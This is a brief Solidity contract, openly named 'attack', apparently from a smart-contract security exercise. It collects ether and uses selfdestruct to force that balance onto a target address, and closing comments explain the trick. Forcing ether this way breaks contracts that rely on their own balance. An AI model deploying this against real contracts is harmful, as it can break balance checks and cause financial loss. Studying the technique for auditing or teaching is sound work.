// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract attack{
    uint totalSum;
    constructor(){

        totalSum =0;

    }
    function payContract() payable public  {
        totalSum +=msg.value;

    }

    function attackContract(address payable  to) public  {

        selfdestruct(to);
    }

}

// we are using selfdestruct function to send funds to the given contract 
// this only works if there are already funds present in the contract that we are destructing